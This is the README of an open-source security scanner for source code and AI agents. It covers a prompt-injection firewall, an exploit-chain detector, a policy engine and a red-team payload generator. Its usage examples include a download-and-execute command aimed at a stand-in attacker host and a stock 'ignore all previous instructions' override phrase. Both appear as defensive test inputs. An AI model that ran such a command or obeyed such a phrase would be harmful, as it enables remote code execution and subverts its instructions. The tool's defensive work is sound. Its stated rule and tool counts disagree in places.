# Agentic AI Cyber Security

<p align="center">
  <img src="banner.svg?v=3" alt="Agentic AI Cyber Security Banner" width="100%"/>
</p>

An open-source Python-based source code security analyzer that identifies security flaws, flags fictitious or non-existent dependencies, prevents prompt injection attacks, and delivers AI-driven semantic code analysis — accessible through MCP integrations with Claude Code or command-line interfaces and CI/CD pipelines.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://python.org)
[![MCP](https://img.shields.io/badge/MCP-Compatible-8A2BE2.svg)](https://modelcontextprotocol.io)
[![Rules](https://img.shields.io/badge/Rules-441-8b5cf6.svg)](#security-rules)
[![SARIF](https://img.shields.io/badge/SARIF-2.1.0-10b981.svg)](#output-formats)
[![Engines](https://img.shields.io/badge/Engines-24-06b6d4.svg)](#analysis-engines-24)
[![MCP Tools](https://img.shields.io/badge/MCP_Tools-30-f59e0b.svg)](#mcp-tools-30)
[![ATLAS](https://img.shields.io/badge/MITRE_ATLAS-Mapped-dc2626.svg)](#mitre-atlas-integration)
[![OWASP](https://img.shields.io/badge/OWASP_LLM_Top_10-Mapped-e11d48.svg)](#owasp-llm-top-10)

---

## What It Does

| Capability | Description |
|------------|-------------|
| **Vulnerability Scanning** | AST analysis, regex patterns, and taint tracking across 16 languages |
| **Package Hallucination Detection** | Bloom filter verification against PyPI, npm, and crates.io — catches AI-hallucinated packages |
| **Prompt Injection Firewall** | 60+ patterns detecting jailbreaks, DAN, data exfiltration, tool abuse, and hidden instructions |
| **AI Semantic Code Review** | LLM-powered context-aware analysis via Claude or OpenAI — same pattern, different verdicts based on project type |
| **Auto-Fix Generation** | 26 CWE-mapped fix templates across 18 vulnerability types with diff output |
| **MCP Server** | 25 tools accessible from Claude Code, Cursor, Windsurf, and other AI editors |
| **Exploit Chain Detection** | Detects multi-step attack sequences: read→encode→exfil, download→write→execute, credential theft→lateral movement |
| **Policy Engine** | Declarative YAML allow/deny rules for agent commands, file access, network, and packages |
| **Runtime Monitor** | Real-time session monitoring with anomaly detection, risk scoring, and progressive alerts |
| **Red Team Generator** | Adversarial test suite with 50+ payloads across 8 categories for benchmarking scanner effectiveness |
| **Dependency Analyzer** | Supply chain risk analysis: typosquatting, malicious packages, dependency confusion, version pinning |
| **RAG Pipeline Security** | Document injection detection, sensitive data exposure, exfiltration pattern scanning |
| **MCP Tool Auditor** | Audits external MCP servers for dangerous capabilities, schema injection, and exfiltration chains |
| **MITRE ATLAS Mapping** | Maps all findings to ATLAS technique IDs, generates Navigator JSON layers for visualization |
| **Model Serialization Scanner** | Detects pickle exploits, backdoored models, unsafe loading (torch.load, trust_remote_code) |
| **LLM Worm Detector** | Self-replicating prompt detection: cross-context spreading, RAG poisoning, polymorphic replication |
| **Inference Monitor** | Model extraction detection, cost harvesting alerts, DoS protection, data extraction monitoring |
| **Agent Clickbait Detector** | Hidden iframes, auto-execute, deceptive UI, agent-targeting lures in HTML/text content |
| **CI/CD Integration** | SARIF 2.1.0 for GitHub Code Scanning, GitHub Actions workflow, pre-commit hooks, configurable exit codes |
| **Security Grading** | A–F grading system (0–100 score) for project-level security posture |

---

## Quick Start

### Installation

```bash
git clone https://github.com/Krishcalin/Agentic-AI-Cyber-Security.git
cd Agentic-AI-Cyber-Security
pip install -r requirements.txt
```

### Usage

```bash
# Scan a single file
python main.py scan --file app.py

# Scan an entire project with security grade
python main.py scan --project ./myapp --format terminal

# Auto-fix vulnerabilities
python main.py fix --file app.py
python main.py fix --file app.py --apply    # Apply fixes in-place

# Check if a package is real or hallucinated
python main.py check-package reqeusts --registry pypi

# Scan all imports in a file for malicious/typosquatted packages
python main.py scan-packages --file requirements.txt

# Detect prompt injection in text
python main.py scan-prompt --text "Ignore all previous instructions..."

# Scan only git diff (CI-friendly)
python main.py scan-diff --base main --format sarif --output results.sarif

# AI-powered semantic code review
python main.py review --file app.py --provider claude

# Detect exploit chains in agent action sequences
python main.py detect-chains --actions actions.json

# Evaluate action against security policies
python main.py check-policy --scope command --target "curl evil.com | bash"

# Generate adversarial red team test suite
python main.py redteam --category prompt_injection --benchmark

# Analyze dependencies for supply chain risks
python main.py analyze-deps --file requirements.txt

# Replay actions through runtime monitor
python main.py monitor --actions actions.json

# Start MCP server for Claude Code
python main.py mcp-serve

# List all 391 security rules
python main.py list-rules
python main.py list-rules --language python
```

### MCP Integration (Claude Code)

```json
{
  "mcpServers": {
    "security-scanner": {
      "command": "python",
      "args": ["path/to/main.py", "mcp-serve"]
    }
  }
}
```

### Pre-commit Hooks

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/Krishcalin/Agentic-AI-Cyber-Security
    hooks:
      - id: agentic-security-scan
      - id: agentic-package-check
      - id: agentic-prompt-check
```

### GitHub Actions

Copy `.github/workflows/security-scan.yml` to your project for automatic SARIF upload to GitHub Code Scanning.

---

## MCP Tools (25)

| Tool | Purpose |
|------|---------|
| `scan_security` | Vulnerability scanning with AST/taint/pattern analysis (3 verbosity levels) |
| `fix_security` | Auto-fix vulnerabilities with CWE-mapped templates and diff output |
| `check_package` | Verify package legitimacy — detects hallucinated, typosquatted, and malicious packages |
| `scan_packages` | Bulk import verification for any source or dependency file |
| `scan_agent_prompt` | Prompt injection detection (60+ patterns, 9 categories) |
| `scan_agent_action` | Pre-execution safety: commands, file writes, URLs, package installs |
| `scan_project` | Full project audit with A–F security grading |
| `scan_git_diff` | Scan only changed files for CI integration |
| `scan_dockerfile` | Dockerfile security hardening audit |
| `scan_iac` | Terraform/Kubernetes misconfiguration detection |
| `semantic_review` | AI-powered context-aware code review (Claude/OpenAI) |
| `scanner_health` | Version, rules loaded, engine status, pattern counts |
| `audit_mcp_server` | Audit external MCP server tools for dangerous capabilities and schema injection |
| `scan_rag_document` | Scan documents for RAG pipeline injection and data leakage |
| `analyze_tool_response` | Analyze MCP tool responses for injection, exfiltration, and escalation |
| `detect_exploit_chains` | Detect multi-step attack sequences in agent action history |
| `evaluate_policy` | Evaluate agent actions against security policies (allow/deny/warn) |
| `generate_redteam` | Generate adversarial test suites for benchmarking scanner defenses |
| `analyze_dependencies` | Supply chain risk analysis for dependency files |
| `monitor_session` | Real-time agent session monitoring with anomaly detection |
| `map_atlas` | Map findings to MITRE ATLAS technique IDs + Navigator JSON layer |
| `scan_model` | Scan ML model files for pickle exploits, backdoors, unsafe loading |
| `detect_llm_worm` | Detect self-replicating prompt patterns (AML.T0052) |
| `monitor_inference` | Track inference API usage for model extraction and cost harvesting |
| `detect_clickbait` | Detect deceptive UI patterns targeting AI agents (AML.T0100) |

---

## Analysis Engines (20)

```
Source Code  → [AST Analyzer] → [Taint Tracker] → [Pattern Matcher] → Findings
Imports      → [Package Checker] → [Bloom Filter + Typosquat] → Alerts
Dependencies → [Dependency Analyzer] → [Supply Chain Risk Analysis] → Alerts
LLM Inputs   → [Prompt Scanner] → [60+ Injection Patterns] → Firewall
Findings     → [Fix Generator] → [26 CWE Templates] → Auto-Fix Patches
Context      → [Semantic Reviewer] → [Claude/OpenAI Analysis] → AI Review
MCP Servers  → [MCP Auditor] → [Tool Risk + Schema Injection] → Audit Report
RAG Docs     → [RAG Scanner] → [Document Injection + Data Leakage] → Findings
Tool Output  → [Tool Response Analyzer] → [Injection + Exfil] → Sanitized Output
Agent Actions→ [Chain Detector] → [Multi-Step Attack Patterns] → Chain Alerts
Agent Actions→ [Policy Engine] → [Allow/Deny/Warn Rules] → Decisions
Agent Session→ [Runtime Monitor] → [Anomaly Detection + Risk Score] → Alerts
Test Suite   → [Red Team Generator] → [50+ Adversarial Payloads] → Benchmark
```

| Engine | What It Does |
|--------|-------------|
| **AST Analyzer** | Python `ast` deep analysis — f-string SQL, subprocess.shell, hardcoded creds, SSL verify |
| **Taint Tracker** | Source → sink flow: Flask/Django input → SQL/eval/os.system/open |
| **Pattern Matcher** | 391 YAML-defined regex rules across 16 languages with CWE/OWASP mapping |
| **Package Checker** | Bloom filters + Levenshtein typosquatting + 25+ known malicious package DB |
| **Prompt Scanner** | 9 categories: jailbreak, extraction, exfiltration, hidden instructions, tool abuse |
| **Fix Generator** | 26 templates: SQL→parameterized, MD5→SHA256, eval→removal, verify=False→True |
| **Semantic Reviewer** | LLM context-aware: subprocess safe in CLI tools, dangerous in web apps |
| **MCP Auditor** | Audits external MCP tool definitions for dangerous patterns, schema injection, exfiltration chains |
| **RAG Scanner** | Document injection detection (9 patterns), sensitive data exposure (10), exfiltration (4) |
| **Tool Response Analyzer** | Analyzes MCP tool output for injection (9), exfiltration (5), escalation (4) with sanitization |
| **Chain Detector** | 20+ chain templates: exfiltration, persistence, privilege escalation, lateral movement, supply chain |
| **Policy Engine** | Declarative YAML policies: command/file/network/package allow/deny rules with rate limiting |
| **Runtime Monitor** | Session risk scoring, frequency spike detection, sensitive access tracking, privilege alerts |
| **Red Team Generator** | 50+ adversarial payloads across 8 categories with benchmarking framework |
| **Dependency Analyzer** | Parses 7 dependency formats, detects typosquats, malicious packages, dependency confusion |
| **ATLAS Mapper** | Maps findings to MITRE ATLAS technique IDs, generates Navigator JSON layers |
| **Model Scanner** | Pickle exploit detection, backdoor indicators, unsafe loading patterns, archive inspection |
| **LLM Worm Detector** | 18+ self-replication patterns: cross-context, RAG poisoning, polymorphic, paired payloads |
| **Inference Monitor** | Model extraction detection, cost harvesting, DoS detection, data extraction monitoring |
| **Clickbait Detector** | 27+ patterns: hidden iframes, auto-execute, agent-targeting lures, deceptive UI |

---

## Security Rules (391)

| Language | Rules | Key Coverage |
|----------|-------|-------------|
| Python | 46 | SQL/cmd/code injection, pickle, YAML, weak crypto, Django/Flask, XXE |
| TypeScript | 34 | XSS, eval, prototype pollution, type safety, Deno sandbox, ReDoS |
| JavaScript | 32 | XSS, eval, prototype pollution, JWT, CORS, Express |
| Shell/Bash | 30 | Command injection, download-and-execute, chmod, secrets in CLI, persistence |
| Rust | 30 | Unsafe blocks, transmute, raw pointers, FFI, SQL format!, static mut |
| Swift | 30 | WebView XSS, Keychain storage, ATS, UserDefaults secrets, unsafe pointers |
| Kotlin | 30 | Android WebView, SharedPreferences, AES/ECB, broadcast, debuggable |
| Java | 25 | SQL injection, deserialization, XXE, Spring, LDAP, EL injection |
| Kubernetes | 22 | Privileged pods, RBAC wildcards, hostPath, secrets in env |
| PHP | 18 | LFI/RFI, mysql_*, eval, unserialize, SSRF |
| C/C++ | 17 | Buffer overflow, format string, gets/strcpy, TOCTOU |
| Go | 16 | SQL concat, InsecureSkipVerify, math/rand, exec.Command |
| Dockerfile | 16 | Root user, :latest tag, secrets in layers, curl\|bash |
| Terraform | 16 | Public S3/SG, IAM wildcards, no encryption, open SSH |
| Ruby | 14 | SQL interpolation, Marshal.load, mass assignment, html_safe |
| Prompt Injection | 8 | Multilingual jailbreaks, agent abuse, encoded payloads |
| Common | 7 | API keys (GitHub/GitLab/Slack/AWS), connection strings, private keys |

---

## Language Support

| Language | AST | Patterns | Taint | Auto-Fix |
|----------|-----|----------|-------|----------|
| Python | Yes | 46 rules | Yes | Yes |
| TypeScript | — | 34 rules | — | Yes |
| JavaScript | — | 32 rules | — | Yes |
| Shell/Bash | — | 30 rules | — | — |
| Rust | — | 30 rules | — | — |
| Swift | — | 30 rules | — | — |
| Kotlin | — | 30 rules | — | — |
| Java | — | 25 rules | — | Yes |
| Kubernetes | — | 22 rules | — | — |
| PHP | — | 18 rules | — | — |
| C/C++ | — | 17 rules | — | — |
| Go | — | 16 rules | — | — |
| Dockerfile | — | 16 rules | — | — |
| Terraform | — | 16 rules | — | — |
| Ruby | — | 14 rules | — | — |

---

## Security Grading

| Grade | Score | Criteria |
|-------|-------|----------|
| **A** | 90-100 | No critical/high findings, ≤2 medium |
| **B** | 75-89 | No critical, ≤2 high, ≤5 medium |
| **C** | 60-74 | No critical, ≤5 high |
| **D** | 40-59 | ≤2 critical, any high/medium |
| **F** | 0-39 | 3+ critical findings |

---

## Output Formats

- **Terminal** — Rich-formatted with syntax highlighting, color-coded severity, grade panel
- **JSON** — Machine-readable with grade, score, and all findings
- **SARIF 2.1.0** — GitHub Code Scanning upload with fingerprints, CWE helpUris, taint codeFlows
- **Diff** — Unified diff output for auto-fix patches

---

## CI/CD Integration

### GitHub Actions (SARIF Upload)
```bash
python main.py scan --project . --format sarif --output results.sarif
# Upload results.sarif to github/codeql-action/upload-sarif
```

### Exit Codes
```bash
python main.py scan-diff --base main --fail-on error    # Exit 2 on critical
python main.py scan-diff --base main --fail-on warning   # Exit 1 on high
python main.py scan-diff --base main --fail-on info       # Exit 1 on any finding
```

### Workflow Annotations
Findings appear as inline annotations on pull request files via GitHub Actions `::error`/`::warning` format.

---

## Architecture

```
Agentic-AI-Cyber-Security/
├── core/                          # 15 analysis engines
│   ├── engine.py                  # Orchestrator — coordinates all engines
│   ├── ast_analyzer.py            # Python AST deep analysis
│   ├── taint_tracker.py           # Source → sink data flow tracking
│   ├── pattern_matcher.py         # Regex rule engine (all languages)
│   ├── package_checker.py         # Package hallucination detection
│   ├── prompt_scanner.py          # Prompt injection firewall
│   ├── semantic_reviewer.py       # LLM-powered code review
│   ├── fix_generator.py           # Auto-fix template engine
│   ├── mcp_auditor.py             # MCP server security auditor
│   ├── rag_scanner.py             # RAG pipeline security scanner
│   ├── tool_response_analyzer.py  # Tool response injection analyzer
│   ├── chain_detector.py          # Multi-step exploit chain detector
│   ├── policy_engine.py           # Declarative YAML policy engine
│   ├── runtime_monitor.py         # Real-time session anomaly detection
│   ├── redteam_generator.py       # Adversarial test suite generator
│   ├── dependency_analyzer.py     # Supply chain dependency analyzer
│   ├── bloom_filter.py            # Pure Python bloom filter
│   ├── import_extractor.py        # Multi-language import extraction
│   ├── rule_loader.py             # YAML rule parser
│   ├── context.py                 # Framework detection + filtering
│   ├── grader.py                  # A–F security grading
│   ├── reporter.py                # Terminal/JSON/SARIF reporters
│   ├── models.py                  # Data models
│   └── logger.py                  # Structured logging
├── mcp_server/                    # MCP server (20 tools)
│   ├── server.py                  # stdio JSON-RPC transport
│   ├── tools.py                   # Tool handler implementations
│   └── schemas.py                 # JSON Schema definitions
├── rules/                         # 391 YAML security rules
│   ├── python.yaml                # 46 rules
│   ├── typescript.yaml            # 34 rules
│   ├── javascript.yaml            # 32 rules
│   ├── shell.yaml                 # 30 rules
│   ├── rust.yaml                  # 30 rules
│   ├── swift.yaml                 # 30 rules
│   ├── kotlin.yaml                # 30 rules
│   ├── java.yaml                  # 25 rules
│   ├── kubernetes.yaml            # 22 rules
│   ├── php.yaml                   # 18 rules
│   ├── c_cpp.yaml                 # 17 rules
│   ├── go.yaml                    # 16 rules
│   ├── dockerfile.yaml            # 16 rules
│   ├── terraform.yaml             # 16 rules
│   ├── ruby.yaml                  # 14 rules
│   ├── prompt_injection.yaml      # 8 rules
│   └── common.yaml                # 7 rules
├── integrations/                  # CI/CD integrations
│   ├── sarif_exporter.py          # Enhanced SARIF 2.1.0 with codeFlows
│   └── github_actions.py          # Annotations + summary
├── cli/main.py                    # Click-based CLI (16 commands)
├── tests/                         # 22 test files
│   ├── fixtures/                  # 8 vulnerable code samples
│   ├── test_tier1_features.py     # MCP auditor, RAG scanner, tool response tests
│   ├── test_tier2_features.py     # Chain, policy, monitor, redteam, deps tests
│   ├── test_benchmark.py          # Precision/recall benchmarks
│   ├── test_integration.py        # End-to-end pipeline tests
│   └── ...                        # Unit tests per engine
├── .github/workflows/             # CI pipeline + security scan template
├── .pre-commit-hooks.yaml         # Pre-commit hook definitions
├── benchmarks/results.md          # Performance and accuracy data
└── data/known_malicious.yaml      # 25+ known malicious packages
```

---

## Development Status

| Phase | Description | Status |
|-------|-------------|--------|
| 1 | Foundation (engine, CLI, 85 initial rules, grading, reporters) | Done |
| 2 | AST Analysis & Taint Tracking (Python source → sink flow) | Done |
| 3 | Package Hallucination Detection (bloom filters, typosquatting, malicious DB) | Done |
| 4 | Prompt Injection Firewall (60+ patterns, 9 categories) | Done |
| 5 | Auto-Fix Engine (26 templates, 18 CWEs, diff output) | Done |
| 6 | MCP Server (12 tools, stdio transport, Claude Code/Cursor/Windsurf) | Done |
| 7 | Semantic Code Review (Claude/OpenAI, project type detection, mock fallback) | Done |
| 8 | Multi-Language Rules (237 rules across 12 languages) | Done |
| 9 | CI/CD Integration (SARIF, GitHub Actions, pre-commit, git diff scanning) | Done |
| 10 | Testing & Benchmarks (20 test files, 8 fixture languages, precision/recall) | Done |
| **Tier 1** | MCP Server Auditor, RAG Pipeline Scanner, Tool Response Analyzer (3 engines, 3 MCP tools) | Done |
| **Tier 2** | Chain Detector, Policy Engine, Runtime Monitor, Red Team Generator, Dependency Analyzer, 5 new language rule files (5 engines, 5 MCP tools, 154 new rules) | Done |
| **Tier 3** | MITRE ATLAS Mapper, Model Serialization Scanner, LLM Worm Detector, Inference Monitor, Clickbait Detector (5 engines, 5 MCP tools, ATLAS technique mapping) | Done |
| **P1** | OWASP LLM Top 10 Mapper, HTML Report Template, Policy Profiles (strict/permissive/enterprise), C# rules (30), YAML security rules (20) | Done |
| **P2** | Agent Sandbox Evaluator, Enhanced Secrets Scanner (40+ patterns + entropy), SBOM Generator (CycloneDX 1.5) | Done |
| **P3** | Dockerfile, PyPI publish workflow, Docker Hub publish, mypy type checking in CI | Done |

**All phases complete — 24 engines, 30 MCP tools, 441 rules, 19 languages, MITRE ATLAS + OWASP LLM Top 10 mapped.**

---

## Contributing

Contributions are welcome. See [CLAUDE.md](CLAUDE.md) for architecture details, coding conventions, and development phases.

To add a new security rule:
1. Add entries to `rules/{language}.yaml` following the existing format
2. Include `id`, `languages`, `severity`, `message`, `cwe`, and `patterns`
3. Add a test case in the corresponding fixture file
4. Run `python main.py list-rules --language {lang}` to verify

---

## Disclaimer

This tool is intended for **authorized security analysis only**. Always ensure you have proper authorization before scanning code you do not own.

---

## License

[MIT](LICENSE)
